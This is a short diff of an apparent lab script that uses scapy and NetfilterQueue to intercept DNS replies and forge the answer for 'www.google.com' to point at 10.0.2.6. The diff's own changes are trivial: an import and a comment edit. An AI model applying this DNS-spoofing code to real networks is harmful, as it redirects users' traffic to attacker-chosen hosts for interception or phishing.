@@ -1,4 +1,6 @@
+#import netfilterqueue
 from scapy.all import *
+import os
 from netfilterqueue import NetfilterQueue
 
 def modify(packet):
@@ -35,7 +37,7 @@ def modify(packet):
 
         modifiedPacket[DNS].an = DNSRR(rrname = "www.google.com", type=dnsPacket[DNS].an.type, rdata='10.0.2.6', rclass=dnsPacket[DNS].an.rclass, rdlen=dnsPacket[DNS].an.rdlen, ttl=100)
 
-        #recalculate the checksum
+        #calculate the checksum
         print("new packet")
         modifiedPacket.show2()
 
